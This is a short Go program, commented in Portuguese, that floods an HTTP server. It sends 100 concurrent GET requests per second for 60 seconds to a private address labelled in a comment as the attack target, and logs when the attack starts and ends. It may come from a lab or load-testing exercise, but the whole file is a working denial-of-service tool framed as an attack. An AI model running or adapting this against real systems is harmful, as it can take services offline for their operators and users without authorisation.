package main

import (
    "fmt"
    "net/http"
    "sync"
    "time"
)

func sendRequest(wg *sync.WaitGroup, url string) {
    defer wg.Done()

    _, err := http.Get(url)
    if err != nil {
        fmt.Printf("Erro ao enviar requisição: %v\n", err)
    } else {
        fmt.Println("Requisição enviada!")
    }
}

func main() {
    const url = "http://10.10.2.1:8000" // Alvo do ataque
    const duration = 60                  // Tempo total de execução em segundos
    const rate = 100                     // Número de requisições por segundo

    var wg sync.WaitGroup
    startTime := time.Now() // Captura o timestamp de início

    fmt.Printf("Início do ataque: %s\n", startTime.Format("2006-01-02 15:04:05"))

    ticker := time.NewTicker(time.Second / time.Duration(rate))
    done := time.After(time.Duration(duration) * time.Second)

    for {
        select {
        case <-done:
            ticker.Stop()
            wg.Wait() // Aguarda todas as goroutines finalizarem
            endTime := time.Now() // Captura o timestamp de término
            fmt.Printf("Fim do ataque: %s\n", endTime.Format("2006-01-02 15:04:05"))
            fmt.Printf("Duração total: %v\n", endTime.Sub(startTime))
            return
        case <-ticker.C:
            wg.Add(1)
            go sendRequest(&wg, url)
        }
    }
}
